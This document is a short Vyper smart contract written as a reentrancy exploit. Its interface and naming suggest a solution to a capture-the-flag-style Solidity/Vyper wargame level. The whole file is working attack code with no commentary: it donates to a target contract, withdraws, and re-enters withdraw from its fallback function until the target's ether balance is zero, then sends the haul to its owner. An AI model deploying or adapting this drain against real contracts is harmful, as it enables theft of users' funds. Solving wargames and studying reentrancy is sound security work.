# @version ^0.3.7

interface InstanceInterface:
    def balanceOf(_who: address) -> uint256: view
    def withdraw(_amount: uint256): nonpayable

owner: immutable(address)

instance: address

@external
@payable
def __init__(_instance: address):
    assert msg.value >= as_wei_value(0.001, "ether"), "send >= 0.001 ETH"
    owner = msg.sender
    self.instance = _instance

@external
@view
def instanceBalance() -> uint256:
    return self.instance.balance

@external
def attack():
    assert msg.sender == owner, "!owner"
    self._donate()
    assert InstanceInterface(self.instance).balanceOf(self) > 0, "donate"
    value: uint256 = InstanceInterface(self.instance).balanceOf(self)
    InstanceInterface(self.instance).withdraw(value)
    assert self.instance.balance == 0, "bal !0"

@external
def withdraw():
    assert msg.sender == owner, "!owner"
    send(msg.sender, self.balance)

@internal
def _donate():
    raw_call(
        self.instance,
        concat(
            method_id("donate(address)"),
            convert(self, bytes32),
        ),
        value=self.balance,
    )

@external
@payable
def __default__():
    if self.instance.balance > 0:
        InstanceInterface(self.instance).withdraw(msg.value)
